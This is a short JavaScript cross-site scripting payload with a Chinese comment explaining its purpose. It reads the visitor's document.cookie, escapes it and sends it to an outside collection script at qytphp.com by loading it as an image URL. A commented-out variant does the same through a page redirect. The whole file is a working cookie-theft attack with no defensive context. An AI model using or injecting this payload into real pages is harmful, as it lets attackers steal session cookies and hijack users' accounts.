//制作一个图片，图片连接即讲过cookie 发给服务端
var img = new Image();
var qytcookie = escape(document.cookie);
img.src = "http://www.qytphp.com/xss.php?sid=" + qytcookie;

//var qytcookie = escape(document.cookie);
//windows.location = "http://www.qytphp.com/xss.php?sid=" + qytcookie;